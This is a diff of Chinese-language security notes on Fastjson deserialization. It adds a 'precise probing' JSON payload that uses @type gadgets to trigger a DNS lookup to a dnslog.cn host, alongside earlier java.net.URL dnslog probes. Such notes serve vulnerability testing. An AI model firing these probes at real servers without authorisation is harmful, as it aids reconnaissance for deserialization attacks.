@@ -55,6 +55,12 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
 {{"@type":"java.net.URL","val":"http://dnslog"}:0
 ```
 
+精确探索
+https://github.com/pen4uin/awesome-java-security/tree/main/alibaba%20fastjson
+```
+[{"@type":"java.net.CookiePolicy"},{"@type":"java.net.Inet4Address","val":"ydk3cz.dnslog.cn"}]
+```
+
 
 ## 利用链挖掘
 https://xz.aliyun.com/t/7482   
